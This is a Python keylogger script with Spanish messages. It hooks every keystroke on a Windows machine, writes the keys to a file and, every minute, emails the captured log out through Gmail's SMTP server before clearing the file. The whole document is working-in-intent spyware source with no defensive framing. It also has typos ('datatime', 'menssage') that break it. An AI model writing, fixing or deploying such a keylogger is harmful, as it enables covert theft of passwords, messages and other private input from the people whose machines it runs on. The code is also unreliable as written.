import pyHook, pythoncom, sys, logging
import time, datetime
from account import email, passw

wait_seconds = 60
timeout = time.time() + wait_seconds
file_log = 'E:\\dat.txt'

def TimeOut():
    if time.time() > timeout:
        return True
    else:
        return False

def SendEmail(user,pasw,destino, subject, boody):
    import smtplib #script onli for gmail
    FROM = user
    TO = destino if type (destino) is list else (destino)
    SUBJECT = subject
    TEXT = boody

    message = """\nFrom: %s\nTO: %s\nSubject: %s\n\n%s
    """ % (FROM, ", ".join(TO), SUBJECT, TEXT)
    
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.ehlo()
        server.starttls()
        server.login(user, pasw) 
        server.sendmail(FROM, TO, message)
        server.close()
        print ('Correo enviado satifactoriamente!')
    except:
        print ('Error al mandar correo')

def FormatAndSendLogEmail():
        f= open(file_log, 'r')
        adate = datatime.datatime.now().strftime("%Y-%m-%d %H:%M:%S")
        data = f.read().replace('\n','')
        data = 'Log capturado a las: '+ adate + '\n' + data
        SendEmail(email, passw, email,'Nuevo log - ' + adate, data)
        f.seek(0)
        f.truncate() 
        
def OnKeyboardEvent(event):
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(menssage)s')
    logging.log(10, chr(event.Ascii))
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.keyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()

while True:
    if TimeOut ():
        FormatAndSendLogEmail()
        timeout = (time.time() + wait_seconds)
    pythoncom.PumpWaitingMessages()